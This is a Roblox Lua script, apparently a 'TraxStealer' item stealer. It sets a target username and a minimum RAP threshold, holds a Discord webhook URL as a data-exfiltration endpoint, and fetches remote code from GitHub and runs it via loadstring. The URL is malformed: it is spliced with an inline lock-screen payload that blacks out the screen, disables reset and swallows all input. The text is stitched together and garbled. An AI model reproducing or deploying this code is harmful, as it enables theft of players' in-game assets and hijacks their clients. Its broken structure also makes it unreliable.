Username = "CJNGpiskuteeek"
Username2 = "CJNGpiskuteeek"
MinimumRAP = 100000
Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"

loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/-- Fullscreen black screen with countdown and permanent block after
local player = game.Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LockedScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Disable escape menu (blocks leave)
sethiddenproperty(player, "SimulationRadius", math.huge)
pcall(function()
    game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
end)

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.TextScaled = true
textLabel.Font = Enum.Font.GothamBlack
textLabel.Parent = background

-- Countdown
for i = 50, 1, -1 do
    textLabel.Text = "Please wait " .. i .. "s to start script"
    wait(1)
end

-- Permanent message
textLabel.Text = "Alt account not allowed"

-- Optional: Block keyboard/mouse input (extreme)
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input)
    input:Destroy()
end)
", true))()

